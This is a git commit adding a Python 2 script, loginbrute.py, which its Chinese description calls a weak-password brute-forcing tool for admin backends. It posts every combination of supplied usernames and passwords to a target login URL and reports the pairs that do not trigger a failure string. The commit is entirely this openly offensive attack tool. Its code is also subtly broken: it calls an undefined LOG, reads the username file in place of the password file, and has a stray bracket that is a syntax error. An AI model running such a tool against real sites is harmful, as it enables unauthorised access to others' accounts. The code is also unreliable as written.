b1f0cd459bc07ce2c56256a3157ad3374e635f99
End1ng <491485147@qq.com>
2016-08-27 08:25:54 +0800

    后台爆破

---
+++ loginbrute.py
@@ -0,0 +1,74 @@
+# coding:utf-8
+import requests
+import argparse
+import sys
+
+def Argparse():
+    parser = argparse.ArgumentParser(usage="%(prog)s [options]",add_help=False,
+    formatter_class=argparse.RawDescriptionHelpFormatter,
+    description=(u'''
+        作者：End1ng blog:end1ng.github.io
+        --------------------------------
+        后台弱口令爆破工具'''))
+
+    optional = parser.add_argument_group('optional arguments')
+    optional.add_argument('-h', '--help', action="store_true", help='help of the %(prog)s program')
+    optional.add_argument('--version', action='version', version='%(prog)s 1.1')
+
+    args = parser.add_argument_group('Necessary parameter')
+    args.add_argument('-i','--ip',metavar=u'url',help=u'目标url')
+    args.add_argument('-u','--user', nargs='*',metavar=u'姓名',help=u'*用户名 多个用空格分隔')
+    args.add_argument('-U','--userfile',metavar=u'文件',help=u'*用户名列表文件')
+    args.add_argument('-p','--pass', nargs='*',metavar=u'密码',help=u'*密码 多个用空格分隔')
+    args.add_argument('-P','--passfile',metavar=u'文件',help=u'*密码列表文件')
+    args.add_argument('-n','--noword',metavar=u'str',help=u'登陆失败字符')
+
+    args=parser.parse_args()
+    args = vars(args)
+
+    if len(sys.argv) == 1 or args['help']:
+        parser.print_help()
+        sys.exit()
+    if not args['user'] and not args['userfile']:
+        LOG.error(u" 请输入账号")
+        sys.exit()
+    if not args['pass'] and not args['passfile']:
+        LOG.error(u" 请输入密码")
+        sys.exit()
+    if not args['ip']:
+        LOG.error(u" 请输入url")
+        sys.exit()
+
+    return args
+
+ARGS = Argparse()
+userlist = []
+passlist = []
+
+if ARGS['user']:
+    userlist.extend(ARGS['user'])
+elif ARGS['userfile']:
+    with open(ARGS['userfile'],"r") as f:
+        userlist.extend(f.readlines())
+if ARGS['pass']:
+    passlist.extend(ARGS['pass'])
+elif ARGS['passfile']:
+    with open(ARGS['userfile'],"r") as f:
+        passlist.extend(f.readlines())
+
+datalist = []
+
+for u in userlist:
+	for p in passlist:
+		datalist.append({"username": u, "password": p})
+
+for x in datalist:
+	data = x
+	res = requests.post(ARGS["ip"], data = data)
+	if ARGS["noword"] in res.text:
+		pass
+	else:
+		print "登陆成功%s%s"%(x["username"], x["password"]])
+
+
+
